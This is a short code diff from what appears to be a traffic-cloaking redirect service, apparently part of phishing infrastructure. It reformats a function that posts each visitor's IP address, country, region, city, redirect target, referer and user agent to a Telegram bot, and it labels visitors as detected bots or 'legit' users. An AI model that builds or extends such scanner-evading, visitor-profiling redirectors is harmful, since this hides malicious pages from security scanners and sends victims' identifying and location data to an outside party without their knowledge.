@@ -59,10 +59,26 @@ const isKnownScannerIP = (ip) => {
 };
 
 const sendToTelegram = async (data) => {
+  const isBot = data.isBot;
+  const title = isBot ? '🛡 Bot Detected' : '🚀 Legit User Redirect';
+
+  const message = [
+    `*${title}*`,
+    `Time: \`${data.timestamp}\``,
+    `User IP: \`${data.ip}\``,
+    `Country: ${data.country || '—'}`,
+    `Region: ${data.region || '—'}`,
+    `City: ${data.city || '—'}`,
+    `To: ${data.redirect || '—'}`,
+    `Source: \`${data.source || '—'}\``,
+    `Referer: \`${data.referer || '—'}\``,
+    `UA: \`${data.ua?.slice(0, 80) || '—'}...\``
+  ].join('\n');
+
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
-      text: `📡 *New Redirect:*\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n*Reason:* ${data.botReason || 'Legit User'}\n*Source:* ${data.source}`,
+      text: message,
       parse_mode: 'Markdown'
     });
   } catch (err) {
